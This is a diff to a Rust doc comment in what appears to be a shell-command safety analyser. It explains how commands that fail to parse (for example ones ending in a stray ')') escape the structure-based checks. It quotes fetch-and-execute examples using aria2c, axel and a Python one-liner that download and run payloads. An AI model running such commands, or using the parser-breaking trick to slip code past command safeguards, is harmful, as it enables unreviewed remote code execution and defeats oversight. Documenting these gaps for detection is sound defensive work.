@@ -3,10 +3,12 @@
 //! When the Bash grammar rejects a command, every structure-based check is
 //! blind: there is no tree to follow a download into a file or a pipe into an
 //! interpreter. The `fetch_exec_unanalyzable` safety net in `analyze_command`
-//! only fired when a text rule had already recognised the shape, so
-//! `aria2c URL -o r && chmod +x r && ./r )` or a Python one-liner that saves a
-//! payload followed by `bash r.sh )` scored `allow`: the trailing `)` cost the
-//! parser its tree and nothing lexical knew the downloader. The grammar is
+//! only fired when a text rule had already recognised the shape. When it was
+//! added, `aria2c URL -o r && chmod +x r && ./r )` and a Python one-liner that
+//! saves a payload followed by `bash r.sh )` scored `allow`; the lexical staged
+//! correlation now knows those downloaders, but it still needs to link the
+//! file a fetch writes to the file that runs, and
+//! `axel URL; sh "$(ls -t | head -1)" )` names no such file. The grammar is
 //! also stricter than bash in places, so "does not parse" is not "does not
 //! run".
 //!
